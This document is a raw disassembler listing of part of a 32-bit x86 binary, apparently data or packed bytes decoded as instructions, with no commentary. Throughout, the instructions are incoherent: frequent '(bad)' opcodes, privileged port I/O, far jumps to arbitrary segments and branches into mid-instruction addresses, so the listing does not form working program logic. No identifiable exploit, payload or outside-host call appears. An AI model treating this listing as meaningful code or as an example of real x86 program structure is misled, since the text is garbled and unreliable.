  414fd4:	jb     0x415033
  414fd6:	dec    ebx
  414fd7:	adc    dl,bh
  414fd9:	cmp    al,0xb7
  414fdb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414fdc:	ins    BYTE PTR es:[edi],dx
  414fdd:	ret    
  414fde:	pop    esp
  414fdf:	fsubr  DWORD PTR [esi]
  414fe1:	xor    eax,0x60b51300
  414fe6:	push   edi
  414fe7:	mov    ch,0x9b
  414fe9:	lock push esp
  414feb:	das    
  414fec:	sub    esp,DWORD PTR [eax]
  414fee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414fef:	in     al,dx
  414ff0:	push   edi
  414ff1:	mov    gs,WORD PTR [eax]
  414ff3:	shr    DWORD PTR [ebp+0x1e],0xb6
  414ff7:	(bad)  
  414ff8:	cmc    
  414ff9:	fptan  
  414ffb:	xchg   edx,eax
  414ffc:	pop    edx
  414ffd:	cmp    dh,BYTE PTR [eax-0x6c]
  415000:	mov    dl,bh
  415002:	jb     0x414fe9
  415004:	pop    esi
  415005:	push   ds
  415006:	lods   al,BYTE PTR ds:[esi]
  415007:	into   
  415008:	out    dx,al
  415009:	or     bl,BYTE PTR [esp+ecx*2+0x49]
  41500d:	inc    ecx
  41500e:	jp     0x41504b
  415010:	sub    al,0x6c
  415012:	xor    DWORD PTR [edi+0x70],0xfffffffe
  415016:	push   esp
  415017:	jecxz  0x414fa7
  415019:	pop    eax
  41501a:	adc    bh,bl
  41501c:	ret    0xc13d
  41501f:	xor    ch,BYTE PTR [ecx+0x2d]
  415022:	cmc    
  415023:	cdq    
  415024:	cmp    cl,BYTE PTR [ebp+0x74]
  415027:	jae    0x414fdf
  415029:	jne    0x41505d
  41502b:	(bad)  
  41502c:	pop    esp
  41502d:	sub    edx,ebx
  41502f:	adc    eax,DWORD PTR [ebp-0x25c30e1a]
  415035:	es inc edi
  415037:	sti    
  415038:	hlt    
  415039:	or     ecx,DWORD PTR [ecx+0x26]
  41503c:	(bad)  
  41503e:	pop    edx
  41503f:	int    0xa8
  415041:	dec    edi
  415042:	int3   
  415043:	mov    dh,0xdd
  415045:	mov    esp,0x4f6cbc39
  41504a:	fstp   TBYTE PTR [ecx+0x101570a]
  415050:	push   edx
  415051:	fnsave [edi+0x3a]
  415054:	loop   0x415053
  415056:	jo     0x415003
  415058:	int3   
  415059:	inc    eax
  41505a:	ja     0x415002
  41505c:	test   DWORD PTR [esi],esi
  41505e:	pop    ebx
  41505f:	leave  
  415060:	push   esi
  415061:	mov    edx,0x3b42ed14
  415066:	pop    esp
  415067:	int3   
  415068:	mov    ?,edx
  41506a:	call   0x1485f0e9
  41506f:	daa    
  415070:	lahf   
  415071:	aad    0x84
  415073:	loope  0x4150ce
  415075:	mov    ds:0x21a7e7cc,al
  41507b:	(bad)  
  41507c:	jb     0x41501f
  41507e:	mov    al,0xe4
  415080:	stc    
  415081:	xor    DWORD PTR [edx],esp
  415083:	jo     0x415093
  415085:	repz cmp ebx,DWORD PTR [esp+ebx*1+0x79d5762d]
  41508d:	(bad)  
  41508e:	or     cl,BYTE PTR [eax+0x0]
	...
  4150f1:	add    BYTE PTR [eax],al
  4150f3:	add    BYTE PTR [ebx+0x2],bh
  4150f6:	add    ebp,ebx
  4150f8:	jnp    0x4150e5
  4150fa:	sti    
  4150fb:	xchg   edx,eax
  4150fc:	lahf   
  4150fd:	mov    esi,0x1735fc2d
  415102:	xor    al,0xbc
  415104:	or     al,0xde
  415106:	add    BYTE PTR [eax],al
  415108:	add    al,0x1
  41510a:	add    BYTE PTR [eax],al
  41510c:	dec    ecx
  41510d:	jbe    0x4150de
  41510f:	dec    ecx
  415110:	sahf   
  415111:	xor    al,0x4a
  415113:	xor    dl,BYTE PTR [ecx]
  415115:	(bad)  
  415116:	and    edx,DWORD PTR [ecx+esi*8-0x6e]
  41511a:	loope  0x41519a
  41511c:	fcmovnu st,st(7)
  41511e:	mov    DWORD PTR [ecx+edx*8-0x50],esi
  415122:	jnp    0x41515a
  415124:	or     BYTE PTR [edi-0x7c825e1e],cl
  41512a:	xchg   BYTE PTR [eax+0x6f],dl
  41512d:	fmul   QWORD PTR [edi]
  41512f:	jecxz  0x4151ae
  415131:	mov    BYTE PTR [eax],ah
  415133:	out    0x78,al
  415135:	dec    edx
  415136:	sbb    BYTE PTR [esp+ebp*1+0x6d],cl
  41513a:	xor    ebx,esp
  41513c:	add    ah,bl
  41513e:	mov    ecx,0x5c05cf9f
  415143:	imul   ebp,DWORD PTR [esi+ecx*1+0x76ddd9a9],0x0
  41514b:	sbb    bh,al
  41514d:	adc    esi,DWORD PTR [ecx+edx*4+0x38]
  415151:	dec    edx
  415152:	lea    eax,[edi]
  415154:	jne    0x415144
  415156:	dec    esi
  415157:	je     0x4151a5
  415159:	mov    edx,0x36a16145
  41515e:	cmp    al,0x7
  415160:	sbb    eax,0xe0b0b882
  415165:	xchg   edi,eax
  415166:	sahf   
  415167:	xchg   edi,eax
  415168:	nop
  415169:	out    0x6,eax
  41516b:	jmp    0x7f331173
  415170:	sub    al,0x10
  415172:	add    ecx,DWORD PTR [eax+0x1a3d8a52]
  415178:	clc    
  415179:	sahf   
  41517a:	mov    WORD PTR [edi-0x6ea77fd7],fs
  415180:	and    BYTE PTR [edx],bl
  415182:	and    BYTE PTR ds:0xb4ea27da,bl
  415188:	push   ds
  415189:	sbb    ch,BYTE PTR [eax]
  41518b:	cmp    al,0x52
  41518d:	mov    dl,0x3e
  41518f:	xor    DWORD PTR [ecx-0x5ba72e7c],ebp
  415195:	outs   dx,DWORD PTR ds:[esi]
  415196:	outs   dx,BYTE PTR ds:[esi]
  415197:	cmp    al,0x25
  415199:	mov    eax,DWORD PTR [ebx+esi*2-0x65]
  41519d:	jns    0x41521c
  41519f:	inc    edx
  4151a0:	mov    ch,0x39
  4151a2:	mov    ds:0x14f89a34,eax
  4151a7:	mov    ebp,0x7ffea1cb
  4151ac:	(bad)  
  4151ad:	std    
  4151ae:	fisttp DWORD PTR es:[ecx+0x54]
  4151b2:	mov    fs,ebx
  4151b4:	or     DWORD PTR [ebp+0x62a0f2f3],0x78
  4151bb:	mov    dh,0x83
  4151bd:	aaa    
  4151be:	push   eax
  4151bf:	mov    ch,0xa3
  4151c1:	cli    
  4151c2:	out    dx,al
  4151c3:	mov    edx,0x3192e70f
  4151c8:	sbb    eax,0x6f018cde
  4151cd:	popf   
  4151ce:	pop    ecx
  4151cf:	retf   
  4151d0:	punpcklbw mm7,DWORD PTR [esi-0x79]
  4151d4:	pushf  
  4151d5:	xor    BYTE PTR [esp+ebx*2+0x1ea8881b],bh
  4151dc:	push   ebx
  4151dd:	mov    esp,0xef55ecce
  4151e2:	aas    
  4151e3:	inc    esp
  4151e4:	jo     0x415239
  4151e6:	lods   al,BYTE PTR ds:[esi]
  4151e7:	xor    DWORD PTR [ebx],0xeacadc45
  4151ed:	mov    ch,0xbd
  4151ef:	xchg   DWORD PTR [edi-0x35],edi
  4151f2:	mov    al,0x58
  4151f4:	push   es
  4151f5:	xor    DWORD PTR [ebx],0x73
  4151f8:	push   esp
  4151f9:	jle    0x415261
  4151fb:	cmp    dh,BYTE PTR [ebx-0x54]
  4151fe:	add    al,0x3
  415200:	sbb    eax,0xca33c2b5
  415205:	in     eax,0x55
  415207:	loop   0x41523b
  415209:	das    
  41520a:	adc    bl,dh
  41520c:	cmp    DWORD PTR [edi],edx
  41520e:	lods   eax,DWORD PTR ds:[esi]
  41520f:	jmp    0x415214
	...
  415274:	sub    al,0x97
  415276:	pop    ds
  415277:	sar    DWORD PTR [edi-0x6001127],1
  41527d:	(bad)  
  41527e:	mov    ecx,0x5a16220b
  415283:	out    0x10,al
  415285:	fild   WORD PTR [eax]
  415287:	add    BYTE PTR [ecx+eax*1],al
  41528a:	add    BYTE PTR [eax],al
  41528c:	daa    
  41528d:	aad    0xae
  41528f:	out    0xda,al
  415291:	mov    dl,0x64
  415293:	mov    ebx,0x94067939
  415298:	sub    dh,bh
  41529a:	add    edx,ebx
  41529c:	jmp    0xb9d1244e
  4152a1:	test   al,0x63
  4152a3:	cdq    
  4152a4:	jnp    0x415324
  4152a6:	leave  
  4152a7:	mov    ch,0x92
  4152a9:	and    DWORD PTR [ecx+0x24],ecx
  4152ac:	cdq    
  4152ad:	xor    ecx,DWORD PTR [ebx]
  4152af:	in     eax,dx
  4152b0:	(bad)  
  4152b1:	and    DWORD PTR [ebp-0x5443b47a],eax
  4152b7:	pop    ss
  4152b8:	cli    
  4152b9:	jne    0x415301
  4152bb:	cmp    BYTE PTR [ecx+esi*4],cl
  4152be:	out    0xb5,eax
  4152c0:	pop    ecx
  4152c1:	ret    
  4152c2:	pop    ecx
  4152c3:	ret    
  4152c4:	clc    
  4152c5:	loopne 0x41526b
  4152c7:	pop    ecx
  4152c8:	test   BYTE PTR [edi-0x33],cl
  4152cb:	mov    ds:0x2394422d,al
  4152d0:	scas   eax,DWORD PTR es:[edi]
  4152d1:	ficom  WORD PTR [edx+0x7c]
  4152d4:	out    0x12,eax
  4152d6:	ja     0x4152ca
  4152d8:	jmp    0x415288
  4152da:	jecxz  0x41525f
  4152dc:	mov    ah,BYTE PTR [ebx]
  4152de:	shr    BYTE PTR [eax-0x73b95cf],cl
  4152e4:	in     al,dx
  4152e5:	sbb    eax,0x69e09031
  4152ea:	mov    DWORD PTR [edi],esi
  4152ec:	dec    ebp
  4152ed:	call   0xff36d41c
  4152f2:	fnstcw WORD PTR [esp+esi*4]
  4152f5:	retf   0x34c8
  4152f8:	push   ds
  4152f9:	xor    DWORD PTR [eax-0x7a],eax
  4152fc:	(bad)  
  4152fd:	cmc    
  4152fe:	rcl    DWORD PTR [eax+0x12],1
  415301:	fwait
  415302:	pop    ds
  415303:	sbb    DWORD PTR [esi-0x55cdb571],edi
  415309:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41530a:	rol    BYTE PTR [edi-0x2ce04f69],cl
  415310:	pop    esi
  415311:	jnp    0x4152f1
  415313:	fdivr  st,st(2)
  415315:	or     eax,DWORD PTR [esi-0x22bc5ec]
  41531b:	neg    edi
  41531d:	js     0x415323
  41531f:	pushf  
  415320:	adc    eax,DWORD PTR ds:0xb03e3355
  415326:	pop    esp
  415327:	popf   
  415328:	lea    ecx,[ebx-0x1a8df3cd]
  41532e:	cmc    
  41532f:	icebp  
  415330:	mov    ds:0x1f1c67db,al
  415335:	add    ecx,DWORD PTR [eax-0x4a10dba8]
  41533b:	repnz jecxz 0x4152ed
  41533e:	es dec edi
  415340:	inc    edi
  415341:	out    dx,eax
  415342:	or     DWORD PTR [ebp-0x387df962],ebx
  415348:	add    DWORD PTR [ebx-0x4d10a91b],esp
  41534e:	arpl   WORD PTR [ebx+0xf],ax
  415351:	cmc    
  415352:	sbb    BYTE PTR [esi],0xf0
  415355:	xchg   esi,eax
  415356:	dec    edx
  415357:	popa   
  415358:	sahf   
  415359:	les    esp,FWORD PTR [ebx]
  41535b:	xor    DWORD PTR ds:0x19c6595,edx
  415361:	or     ebx,DWORD PTR [ecx]
  415363:	inc    ebx
  415364:	fisttp DWORD PTR [ebx+ecx*1-0x3d]
  415368:	lock pop eax
  41536a:	mov    esi,0x3c10979d
  41536f:	dec    esp
  415370:	sbb    eax,0x97de5df0
  415375:	pop    edx
  415376:	mov    ds:0x2466ce3b,eax
  41537b:	nop
  41537c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41537d:	add    DWORD PTR [ebx+0x6a],eax
  415380:	lods   eax,DWORD PTR ds:[esi]
  415381:	cwde   
  415382:	jge    0x41531c
  415384:	or     dl,BYTE PTR [ebp+0x41]
  415387:	mov    eax,0x70785bde
  41538c:	scas   eax,DWORD PTR es:[edi]
  41538d:	rol    DWORD PTR [edx+0x74],1
	...
  4153f3:	add    BYTE PTR [ebp-0x10],ch
  4153f6:	repz jmp FWORD PTR cs:[edi]
  4153fa:	std    
  4153fb:	repz mov edi,0xebd3e5b0
  415401:	ss out dx,eax
  415403:	fst    DWORD PTR [eax+eiz*8]
  415406:	add    BYTE PTR [eax],al
  415408:	add    al,0x1
  41540a:	add    BYTE PTR [eax],al
  41540c:	jae    0x415487
  41540e:	nop
  41540f:	mov    eax,ds:0x6f0e38
  415414:	out    dx,al
  415415:	popa   
  415416:	and    al,0x93
  415418:	xchg   DWORD PTR [ebp+edx*4+0x3f7c90ca],ebx
  41541f:	cli    
  415420:	outs   dx,DWORD PTR ds:[esi]
  415421:	mov    ah,0x3d
  415423:	and    ebp,DWORD PTR [edx-0x7af2bbc6]
  415429:	mov    edx,0x33da9a38
  41542e:	add    eax,0x4f
  415431:	fisubr DWORD PTR [ebx+esi*2-0x2f]
  415435:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415436:	out    dx,eax
  415437:	and    eax,ebp
  415439:	pop    edi
  41543a:	cli    
  41543b:	mov    ds:0xcec15eb0,al
  415440:	mov    ebx,edx
  415442:	inc    eax
  415443:	sbb    DWORD PTR [ebx+0x65b96203],eax
  415449:	pushf  
  41544a:	and    eax,0xe7fed007
  41544f:	or     DWORD PTR [edx+0x77],edx
  415452:	and    DWORD PTR [ecx-0x32cbec44],ecx
  415458:	bound  edx,QWORD PTR [edx+0x278ea356]
  41545e:	mov    bl,0x69
  415460:	jns    0x4154d4
  415462:	leave  
  415463:	cwde   
  415464:	sti    
  415465:	xchg   esp,eax
  415466:	ret    0x344d
  415469:	scas   al,BYTE PTR es:[edi]
  41546a:	imul   BYTE PTR [eax+edx*8-0x22]
  41546e:	dec    esi
  41546f:	jb     0x41546e
  415471:	addr16 in eax,0x2
  415474:	mov    ebp,0x1f1f2d84
  415479:	int    0xa2
  41547b:	cmp    DWORD PTR [ebp-0x33f5454],esi
  415481:	retf   0x5243
  415484:	cdq    
  415485:	pop    edx
  415486:	call   0xd130929
  41548b:	cld    
  41548c:	mov    eax,0x9fea7286
  415491:	(bad)  
  415492:	pop    edx
  415493:	imul   esp,DWORD PTR [edx-0x24a20f0],0xffffffff
  41549a:	push   edx
  41549b:	fcomi  st,st(5)
  41549d:	add    DWORD PTR [esi-0x34],edi
  4154a0:	push   esi
  4154a1:	sub    al,BYTE PTR [esi-0x5f]
  4154a4:	loopne 0x415470
  4154a6:	mov    DWORD PTR [esi+ebp*8],edx
  4154a9:	cmp    cl,ah
  4154ab:	iret   
  4154ac:	stos   BYTE PTR es:[edi],al
  4154ad:	int3   
  4154ae:	lods   al,BYTE PTR ds:[esi]
  4154af:	xor    bl,BYTE PTR [ecx-0x486b909f]
  4154b5:	cli    
  4154b6:	mov    ebx,0x4027457b
  4154bb:	popa   
  4154bc:	xor    al,0xf8
  4154be:	retf   
  4154bf:	test   eax,0x117efb3
  4154c4:	jg     0x415487
  4154c6:	add    al,0xc3
  4154c8:	lahf   
  4154c9:	dec    esp
  4154ca:	push   0xe2472ef4
  4154cf:	call   0x2589:0xc3686c8e
  4154d6:	sbb    ch,ch
  4154d8:	scas   eax,DWORD PTR es:[edi]
  4154d9:	iret   
  4154da:	ret    0x7162
  4154dd:	call   0xadd9:0xf04fcc83
  4154e4:	adc    ecx,DWORD PTR [eax-0x1ae7ebad]
  4154ea:	out    0x39,al
  4154ec:	sbb    dl,BYTE PTR [eax+0x22]
  4154ef:	push   esp
  4154f0:	pop    esi
  4154f1:	or     dh,BYTE PTR [ecx+esi*1+0x4409fdf3]
  4154f8:	into   
  4154f9:	shl    al,0x54
  4154fc:	dec    edi
  4154fd:	adc    eax,0xfc0e79b0
  415502:	pop    ds
  415503:	jmp    0xb60a:0xb589d55b
  41550a:	pusha  
  41550b:	in     eax,dx
  41550c:	inc    esi
  41550d:	das    
  41550e:	cs pop ebp
	...
  415574:	in     al,0xf0
  415576:	sub    DWORD PTR [edx],ecx
  415578:	cmp    eax,0xa2fee7db
  41557d:	arpl   WORD PTR [ebx],bp
  41557f:	je     0x415582
  415581:	push   ebp
  415582:	and    cl,BYTE PTR [edi+0xe118]
  415588:	add    al,0x1
  41558a:	add    BYTE PTR [eax],al
  41558c:	or     eax,0x64843db8
  415591:	cwde   
  415592:	(bad)
  415595:	and    eax,0x8f75922c
  41559a:	and    edi,DWORD PTR [ebx]
  41559c:	pop    eax
  41559d:	test   dl,cl
  41559f:	sti    
  4155a0:	lds    ecx,FWORD PTR [ebx-0x5b]
  4155a3:	fnstsw WORD PTR [edx+0x1a]
  4155a6:	inc    ecx
  4155a7:	retf   0x798c
  4155aa:	mov    bl,0xb0
  4155ac:	leave  
  4155ad:	hlt    
  4155ae:	ficom  DWORD PTR [ecx+0x1c]
  4155b1:	and    BYTE PTR ds:0xad4272af,ah
  4155b7:	or     ebp,DWORD PTR [edx-0x5337ede4]
  4155bd:	ins    DWORD PTR es:[edi],dx
  4155be:	pusha  
  4155bf:	xchg   edi,eax
  4155c0:	lea    edi,[ebx]
  4155c2:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  4155c4:	out    dx,al
  4155c5:	inc    ebx
  4155c6:	je     0x4155cf
  4155c8:	test   edi,edi
  4155ca:	mov    dh,0xef
  4155cc:	pop    ss
  4155cd:	adc    ecx,DWORD PTR [eax]
  4155cf:	in     al,0x4f
  4155d1:	lds    edx,FWORD PTR [ecx]
  4155d3:	and    bl,bh
  4155d5:	das    
  4155d6:	sbb    ebx,DWORD PTR [edx-0x1dfe1387]
  4155dc:	out    0x69,al
  4155de:	mov    bh,0x8b
  4155e0:	(bad)  
  4155e1:	test   eax,0x4ab66e7e
  4155e6:	inc    ebx
  4155e7:	mul    BYTE PTR [ecx+esi*8+0x322f1cb0]
  4155ee:	jg     0x4155f0
  4155f0:	or     BYTE PTR [edx],ah
  4155f2:	or     eax,0xba4ab497
  4155f7:	jmp    0x41558d
  4155f9:	mov    esi,0x5d5ebee8
  4155fe:	outs   dx,DWORD PTR ds:[esi]
  4155ff:	jp     0x415618
  415601:	dec    ebx
  415602:	into   
  415603:	or     DWORD PTR [ebp-0x3a],esp
  415606:	imul   ebx,edx,0x4
  415609:	push   cs
  41560a:	sbb    eax,0x7d942c93
  41560f:	das    
  415610:	mov    bh,0x37
  415612:	in     eax,0x77
  415614:	enter  0xad85,0xfb
  415618:	test   eax,0x8e95d995
  41561d:	sbb    DWORD PTR [ecx-0x5c6fd16d],0x5da0d08b
  415627:	jns    0x415694
  415629:	inc    ebp
  41562a:	cmp    eax,0x1432682d
  41562f:	sbb    al,0x38
  415631:	sub    al,0x70
  415633:	mov    dl,0x35
  415635:	jo     0x4155d9
  415637:	inc    ecx
  415638:	mov    dl,0x52
  41563a:	push   ss
  41563b:	mov    DWORD PTR [eax+0x332e9d01],edx
  415641:	add    BYTE PTR [edi],dh
  415643:	nop
  415644:	je     0x4156c4
  415646:	addr16 jge 0x415670
  415649:	mov    bl,0xb1
  41564b:	push   0x35999e64
  415650:	test   edi,ebp
  415652:	out    0x6d,eax
  415654:	mov    bl,0xac
  415656:	aad    0xfb
  415658:	ja     0x415647
  41565a:	nop
  41565b:	inc    edx
  41565c:	into   
  41565d:	and    eax,0xba38f5bf
  415662:	cmp    eax,0xd27bf709
  415667:	scas   al,BYTE PTR es:[edi]
  415668:	xchg   ecx,eax
  415669:	out    0xe5,eax
  41566b:	sub    dh,BYTE PTR [edi]
  41566d:	call   0xc303bdf6
  415672:	aam    0x38
  415674:	pop    es
  415675:	fstp   TBYTE PTR ds:[ecx+0x9]
  415679:	not    BYTE PTR [edx-0x57]
  41567c:	jmp    0xe1a3f51a
  415681:	imul   edx,edi,0x3735fe45
  415687:	arpl   WORD PTR [edx+0x6c6c4e9f],cx
  41568d:	dec    esi
  41568e:	arpl   WORD PTR [ecx+0x0],si
	...
  4156f4:	ins    DWORD PTR es:[edi],dx
  4156f5:	call   0xbafd:0x67ff45bc
  4156fc:	mov    bl,0xba
  4156fe:	inc    esi
  4156ff:	sub    al,0x8b
  415701:	sub    DWORD PTR [esi+0xe21c9c],0x0
  415708:	add    al,0x1
  41570a:	add    BYTE PTR [eax],al
  41570c:	and    eax,0xf6eee3ab
  415711:	add    esi,DWORD PTR [esi-0x80]
  415714:	sysenter 
  415716:	retf   
  415717:	xor    al,0x41
  415719:	ins    DWORD PTR es:[edi],dx
  41571a:	pusha  
  41571b:	dec    ecx
  41571c:	popf   
  41571d:	sbb    edi,ebx
  41571f:	inc    esi
  415720:	add    al,cl
  415722:	sahf   
  415723:	xor    BYTE PTR [esi+0x23],cl
  415726:	mov    dh,BYTE PTR [ecx]
  415728:	test   DWORD PTR [edi+0x7],eax
  41572b:	cmc    
  41572c:	sar    BYTE PTR [edi],0x4d
  41572f:	outs   dx,BYTE PTR ds:[esi]
  415730:	jmp    0x4157a0
  415732:	into   
  415733:	sub    ebp,ebx
  415735:	adc    esp,esp
  415737:	pusha  
  415738:	fdivr  QWORD PTR [esi-0x69374b7]
  41573e:	les    ebx,FWORD PTR [ebx]
  415740:	pop    es
  415741:	dec    esp
  415742:	lea    esi,[esi+0x13]
  415745:	sahf   
  415746:	or     esi,esi
  415748:	sahf   
  415749:	xchg   ebp,eax
  41574a:	jo     0x4156ee
  41574c:	mov    ds:0x25161182,eax
  415751:	scas   al,BYTE PTR es:[edi]
  415752:	sub    eax,DWORD PTR [ebp+0x4e]
  415755:	sub    al,0x7e
  415757:	jg     0x415785
  415759:	and    DWORD PTR [edi-0xd],esp
  41575c:	sub    DWORD PTR [edx],ebx
  41575e:	adc    bl,BYTE PTR [ecx+0x398f6d7e]
  415764:	(bad)  
  415765:	(bad)  
  415766:	cmp    bl,cl
  415768:	pop    ss
  415769:	dec    BYTE PTR [edi+edx*2-0x3d4848e4]
  415770:	xor    DWORD PTR [ebx+0x362284d5],0x56
  415777:	fchs   
  415779:	fild   DWORD PTR [edx]
  41577b:	std    
  41577c:	das    
  41577d:	ins    BYTE PTR es:[edi],dx
  41577e:	jae    0x415737
  415780:	lods   eax,DWORD PTR ds:[esi]
  415781:	shl    BYTE PTR [ecx],cl
  415783:	push   ebp
  415784:	push   esi
  415785:	add    BYTE PTR [edx+esi*2+0x1],al
  415789:	jbe    0x415757
  41578b:	call   0xa7eb:0xd284c6cf
  415792:	(bad)  
  415793:	cmc    
  415794:	mov    esi,0x27e6569b
  415799:	loopne 0x4157d7
  41579b:	cwde   
  41579c:	mov    esp,0xc2e7bbdf
  4157a1:	int    0xd9
  4157a3:	or     DWORD PTR [esi+0x602774b2],edi
  4157a9:	les    edi,FWORD PTR ds:0x74a2e121
  4157af:	(bad)  
  4157b0:	jmp    0x135a2caa
  4157b5:	leave  
  4157b6:	push   ebx
  4157b7:	enter  0xebec,0x59
  4157bb:	ds aas 
  4157bd:	cmp    DWORD PTR [ebx+0x72],edx
  4157c0:	add    al,0xcd
  4157c2:	push   ebx
  4157c3:	sbb    al,0xb7
  4157c5:	fstp   QWORD PTR [ebp+0x3e]
  4157c8:	jmp    0xf087:0xb21e3f90
  4157cf:	data16 and BYTE PTR [edx],bh
  4157d2:	cmp    eax,0x61d5ed8c
  4157d7:	push   0x7b
  4157d9:	stc    
  4157da:	mov    fs,WORD PTR [ecx+ecx*1-0x3c]
  4157de:	(bad)  
  4157df:	js     0x41584d
  4157e1:	adc    al,0xf7
  4157e3:	mov    eax,0x7cf33bad
  4157e8:	cmp    ch,BYTE PTR [esi-0x57]
  4157eb:	and    BYTE PTR [edi-0x37],bl
  4157ee:	push   0xfa6cfcc0
  4157f3:	lea    eax,[esi]
  4157f5:	jecxz  0x415806
  4157f7:	or     al,0xa8
  4157f9:	js     0x415836
  4157fb:	lods   eax,DWORD PTR ds:[esi]
  4157fc:	stc    
  4157fd:	inc    ecx
  4157fe:	mov    ds:0x8770625f,eax
  415803:	cs xchg ecx,eax
  415805:	pop    ss
  415806:	xlat   BYTE PTR ds:[ebx]
  415807:	dec    ebp
  415808:	(bad)  
  415809:	xchg   edi,eax
  41580a:	add    BYTE PTR [ecx],0xaa
  41580d:	sbb    ebx,DWORD PTR [eax+0x7b]
	...
  415874:	retf   
  415875:	(bad)  
  415876:	xchg   ebx,eax
  415877:	in     al,dx
  415878:	mov    bh,0xed
  41587a:	(bad)  
  41587b:	inc    DWORD PTR [edi]
  41587d:	(bad)  
  41587f:	rcl    DWORD PTR [ebp+esi*4-0x1cdfddfe],cl
  415886:	add    BYTE PTR [eax],al
  415888:	add    al,0x1
  41588a:	add    BYTE PTR [eax],al
  41588c:	rcl    DWORD PTR [ebx+0x64],0xab
  415890:	(bad)  
  415891:	lods   eax,DWORD PTR ds:[esi]
  415892:	js     0x4158a4
  415894:	sbb    BYTE PTR [eax+0x6acf30b8],ah
  41589a:	xor    al,0x53
  41589c:	call   FWORD PTR [ecx]
  41589e:	push   edi
  41589f:	mov    WORD PTR [ebx],cs
  4158a1:	sub    bh,0x2a
  4158a4:	iret   
  4158a5:	sti    
  4158a6:	loope  0x41588a
  4158a8:	mov    ds:0x1dda3c95,eax
  4158ad:	ror    DWORD PTR [ecx],1
  4158af:	lahf   
  4158b0:	nop
  4158b1:	test   eax,0x78cc37cb
  4158b6:	pop    ecx
  4158b7:	sbb    DWORD PTR [edx],0xda3fed9d
  4158bd:	xchg   esp,eax
  4158be:	mov    cl,0x36
  4158c0:	push   ds
  4158c1:	inc    edx
  4158c2:	stos   BYTE PTR es:[edi],al
  4158c3:	push   ebp
  4158c4:	xchg   esp,eax
  4158c5:	jbe    0x415894
  4158c7:	jae    0x41590b
  4158c9:	ret    0x55e7
  4158cc:	xor    eax,esp
  4158ce:	in     al,dx
  4158cf:	call   0x808b314
  4158d4:	sbb    bl,dh
  4158d6:	clc    
  4158d7:	call   FWORD PTR [ecx+0x75]
  4158da:	push   DWORD PTR [esi-0x7876ebc6]
  4158e0:	mov    al,ds:0x819b42a9
  4158e5:	push   ecx
  4158e6:	mov    ah,0xae
  4158e8:	mov    al,ds:0x6ea4e5ad
  4158ed:	dec    ebx
  4158ee:	jg     0x4158a7
  4158f0:	popf   
  4158f1:	int    0x86
  4158f3:	mov    eax,ds:0xd9ca5932
  4158f8:	test   eax,0xd5e84fe7
  4158fe:	loop   0x4158e7
  415900:	push   ds
  415901:	push   ebx
  415902:	mov    ch,0x94
  415904:	fdiv   st(5),st
  415906:	fcomp  DWORD PTR [ecx]
  415908:	xchg   BYTE PTR [esi+0x37a4532c],bl
  41590e:	cli    
  41590f:	(bad)  
  415910:	clc    
  415911:	or     ebx,DWORD PTR ss:[esp+ebx*1+0x50]
  415916:	scas   eax,DWORD PTR es:[edi]
  415917:	stos   BYTE PTR es:[edi],al
  415918:	hlt    
  415919:	ins    DWORD PTR es:[edi],dx
  41591a:	fwait
  41591b:	jo     0x4158e0
  41591d:	mov    ?,WORD PTR [ebp+ebx*2-0x12]
  415921:	je     0x41596e
  415923:	call   0xf934bba6
  415928:	repz (bad) 
  41592a:	jmp    edx
  41592c:	push   0x43
  41592e:	ret    
  41592f:	push   ds
  415930:	and    dh,BYTE PTR [edx+0x0]
  415933:	test   BYTE PTR ds:0xda034d0b,ch
  415939:	jge    0x41590d
  41593b:	pop    eax
  41593c:	or     DWORD PTR [ebp+0x37719e2d],esp
  415942:	dec    ecx
  415943:	dec    ebp
  415944:	fmul   DWORD PTR [esp+eax*4-0x22]
  415948:	xor    al,0x36
  41594a:	jbe    0x4158d5
  41594c:	jno    0x41598f
  41594e:	cmc    
  41594f:	sahf   
  415950:	lock popa 
  415952:	mov    bl,0x16
  415954:	js     0x4159d0
  415956:	dec    edi
  415957:	push   DWORD PTR [esi]
  415959:	add    al,0x90
  41595b:	push   esp
  41595c:	push   ecx
  41595d:	daa    
  41595e:	(bad)  
  41595f:	(bad)  
  415960:	cmp    al,0x33
  415962:	xor    al,BYTE PTR [eax-0x61]
  415965:	retf   0x5c48
  415968:	sar    ebx,cl
  41596a:	mov    bl,BYTE PTR [eax-0x64]
  41596d:	fisttp WORD PTR [ebp+0x27]
  415970:	sub    BYTE PTR [ebp+0x1f],0xfa
  415974:	(bad)  
  415975:	and    al,0x9b
  415977:	dec    edi
  415978:	cmp    bl,0x5c
  41597b:	mov    bl,BYTE PTR [ebx]
  41597d:	push   0x1fdd1db3
  415982:	sbb    al,BYTE PTR [edx-0xa1aa1f8]
  415988:	push   ds
  415989:	mov    bl,cl
  41598b:	jmp    0x0:0xd0fec369
	...
  4159f2:	add    BYTE PTR [eax],al
  4159f4:	inc    ebp
  4159f5:	mov    BYTE PTR [edi+esi*2],ch
  4159f8:	in     eax,dx
  4159f9:	neg    DWORD PTR [edi-0x46]
  4159fc:	sub    edi,DWORD PTR [edi-0x10]
  4159ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a00:	mov    eax,ds:0x24a25651
  415a05:	in     al,0x0
  415a07:	add    BYTE PTR [ecx+eax*1],al
  415a0a:	add    BYTE PTR [eax],al
  415a0c:	push   edx
  415a0d:	shl    DWORD PTR [esi+0xbb5fae],cl
  415a13:	mov    DWORD PTR [eax-0x63361a8e],esi
  415a19:	cmp    esp,DWORD PTR [edi+0x15396b2d]
  415a1f:	retf   
  415a20:	pop    eax
  415a21:	dec    edx
  415a22:	cmp    al,0x8
  415a24:	pop    ebx
  415a25:	adc    esp,DWORD PTR ds:0xda45d6bd
  415a2b:	or     ch,BYTE PTR ds:0x941d4aa7
  415a31:	imul   esp,ebp,0xa1c39918
  415a37:	jnp    0x4159c9
  415a39:	les    eax,FWORD PTR [esi]
  415a3b:	pop    edx
  415a3c:	mov    dh,0xfd
  415a3e:	fild   DWORD PTR [edx+0x6c47f50d]
  415a44:	out    dx,al
  415a45:	sti    
  415a46:	jo     0x4159f8
  415a48:	inc    edx
  415a49:	daa    
  415a4a:	push   ecx
  415a4b:	mov    al,ds:0x32446dae
  415a50:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
